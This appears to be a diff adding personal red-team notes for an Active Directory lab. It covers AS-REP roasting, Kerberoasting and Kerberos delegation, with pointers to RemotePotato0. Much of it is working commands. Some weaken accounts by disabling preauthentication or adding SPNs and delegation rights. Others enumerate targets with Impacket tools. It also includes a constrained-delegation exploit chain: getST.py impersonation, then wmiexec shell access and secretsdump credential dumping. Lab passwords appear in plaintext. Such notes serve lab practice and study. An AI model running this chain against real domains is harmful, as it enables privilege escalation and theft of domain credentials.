@@ -1,0 +1,107 @@
+# new attack RemotePotato0
+# https://github.com/antonioCoco/RemotePotato0
+# https://labs.sentinelone.com/relaying-potatoes-dce-rpc-ntlm-relay-eop/
+
+# attack flow:
+	domain user with weak password and spn (kerberoastable) that has constrained delegation on DC for WWW service.
+
+# asreproast attack:
+
+	# Queries target domain for users with 'Do not require Kerberos preauthentication' and returns an encrypted TGS ticket that can be cracked offline  
+
+	# identify asreproastable accounts: 
+	Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
+	wmiexec.py -shell-type powershell sho_luv:WindowsServer2019@WIN-4K6AI0OL89J "Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name"
+
+	# create account:
+	net user aaron Summer2021 /add
+
+	# make account asreproastable by setting doesnotrequirepreauth flag:
+	powershell import-module activedirectory; Set-ADAccountControl -Identity talia  -doesnotrequirepreauth $true
+
+# kerberoast attack:
+
+	# Queries target domain for accounts that has SPNs. Its possible to request encrypted TGS tickets that can be cracked offline
+
+	# identify kerberoastable accounts:
+	GetUserSPNs.py sholuv.local/administrator:WindowsServer2019 -dc-ip 192.168.1.222 
+
+	# create account:
+	net user talia Winter2021 /add
+	
+	# make account kerberoastable by creating SPN
+	setspn -U -S WWW/Can_be_anything sho_luv   # set SPN to be cracked
+
+
+
+# unconstrained delegation:
+
+	# setup unconstrained delegation enviroment:
+		# get powershell cmd:
+		wmiexec.py sho_luv:WindowsServer2019@192.168.1.222 -shell-type powershell
+
+		# create account:
+		net user talia Winter2021 /add
+
+		# create spn that allows the account to be kerberoastable
+		setspn -s cifs/myhubby talia	# add spn to kerberoast
+		setspn -d cifs/myhubby talia	# delete spn to kerberoast
+			# check kerberoastable accounts:
+			GetUserSPNs.py sholuv.local/sho_luv:WindowsServer2019 -dc-ip 192.168.1.222 
+
+		# make account unconstrained:
+		powershell import-module activedirectory; Set-ADAccountControl -Identity talia  -TrustedForDelegation $true
+		powershell import-module activedirectory; Set-ADAccountControl -Identity talia  -TrustedForDelegation $false
+			# check unconstrained accounts:
+			findDelegation.py sholuv.local/sho_luv:WindowsServer2019 -dc-ip 192.168.1.222
+			/root/tools/CrackMapExec/build/lib/cme/thirdparty/pywerview/pywerview.py get-netuser -u sho_luv -p WindowsServer2019 -d sholuv.local -t 192.168.1.222 --allow-delegation
+
+	# exploit unconstrained delegation:
+
+		# Get priveleged user or system to connect to you and capture the TGT of that user. 
+		# Then you can authenticat as that user. 
+		https://malwaredevil.com/2020/09/17/rbcd-attack-kerberos-resource-based-constrained-delegation-attack-from-outside-using-impacket/
+		https://exploit.ph/user-constrained-delegation.html
+
+# constrained delegation:
+
+	# setup constrained delegation enviroment:
+	# https://4sysops.com/archives/how-to-configure-computer-delegation-with-powershell/
+
+	# create computer account:
+	net computer \\kyan-computer$ /add
+
+	# make account constrained:
+	powershell import-module activedirectory; Set-ADAccountControl -Identity kyan-computer$ -TrustedToAuthForDelegation $true
+    Set-ADComputer -Identity kyan-computer$ -Add @{'msDS-AllowedToDelegateTo'=@('WSMAN/targetComputer.sholuv.local','WWW/WIN-4K6AI0OL89J')}
+	Set-ADComputer kyan-computer -PrincipalsAllowedToDelegateToAccount (Get-ADComputer RBCDMachine)
+
+	# check for constrained delegation:
+	get-adcomputer kyan-computer -Properties * | Format-List -Property *delegat*,msDS-AllowedToActOnBehalfOfOtherIdentity
+	get-adcomputer kyan-computer -Properties * | Select-Object -ExpandProperty msDS-AllowedToActOnBehalfOfOtherIdentity |Format-List
+
+	# remove constrained delegation:
+    Set-ADComputer -Identity kyan-computer$ -Remove @{'msDS-AllowedToDelegateTo'=@('HOST/ComputerC','WSMAN/ComputerC.MyDomain.com')}
+
+	# exploit constraied delegation:
+	getST.py sholuv.local/kyan-computer$:Rapid7isc00l -spn WWW/WIN-4K6AI0OL89J -impersonate sho_luv -force-forwardable
+	export KRB5CCNAME=sho_luv.ccache 
+	wmiexec.py -k -no-pass sho_luv@WIN-4K6AI0OL89J
+	secretsdump.py -k -no-pass sho_luv@WIN-4K6AI0OL89J
+
+# resource based constrained delegation:
+
+	# windows server 2012+ object with msDS-AllowedToActOnBehalfOfOtherIdentity attribute
+
+# get information:
+	# powershell:
+	Get-ADDomainController -Discover -Site "Default-First-Site-Name"	# get domain information
+	Get-ADDomainController -Discover -Site "Default-First-Site-Name" -ForceDiscover
+
+	Get-ADUser -Properties * -Identity <username>
+
+# get list of users with reversible encryption
+
+	# powershell command:
+	Get-ADUser -Filter * -Properties * | Select-Object name,AllowReversiblePasswordEncryption 
+
